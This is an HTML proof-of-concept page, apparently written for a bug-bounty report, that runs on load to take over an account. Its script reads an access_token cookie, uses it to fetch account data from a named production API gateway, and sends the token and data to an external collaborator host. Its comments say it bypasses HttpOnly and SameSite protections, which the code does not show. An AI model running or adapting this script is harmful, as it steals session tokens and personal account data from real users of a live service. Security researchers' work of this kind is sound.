<!DOCTYPE html>
<html>
<head>
    <title>Critical Security Audit</title>
    <style>
        body { font-family: sans-serif; background: #1a1a1a; color: #00ff00; padding: 50px; }
        .console { border: 1px solid #333; padding: 20px; background: #000; border-radius: 5px; }
        .stolen { color: #ff0000; font-weight: bold; }
    </style>
</head>
<body>
    <div class="console">
        <h2>[!] Account Takeover PoC</h2>
        <div id="status">Scanning for session...</div>
        <hr>
        <p><strong>Stolen JWT:</strong> <span id="token" class="stolen">None</span></p>
        <p><strong>Stolen Account Data:</strong></p>
        <pre id="data" class="stolen">None</pre>
    </div>

    <script>
        const target = "https://simplecast-cms-api-gateway.eks.simplecast.com/accounts";
        const collaborator = "https://2qtjnu0knyyr0fdm4ki4hilualgc43zro.oastify.com";

        async function exploit() {
            try {
                // 1. Grab token from storage (Bypassing HttpOnly)
                const cookies = document.cookie;
                const tokenMatch = cookies.match(/access_token=([^;]+)/);
                
                if (tokenMatch) {
                    const jwt = tokenMatch[1];
                    document.getElementById('token').innerText = jwt;

                    // 2. Manual Fetch using stolen token (Bypassing SameSite=Lax)
                    const response = await fetch(target, {
                        headers: { "Authorization": "Bearer " + jwt }
                    });
                    const json = await response.json();
                    
                    document.getElementById('data').innerText = JSON.stringify(json, null, 2);
                    document.getElementById('status').innerText = "FULL EXPLOIT SUCCESSFUL";

                    // 3. Exfiltrate to Attacker Server
                    fetch(`${collaborator}/?stolen_data=${btoa(JSON.stringify(json))}&token=${jwt}`);
                } else {
                    document.getElementById('status').innerText = "FAILED: access_token cookie not found.";
                }
            } catch (err) {
                document.getElementById('status').innerText = "Error: " + err.message;
            }
        }
        exploit();
    </script>
</body>
</html>
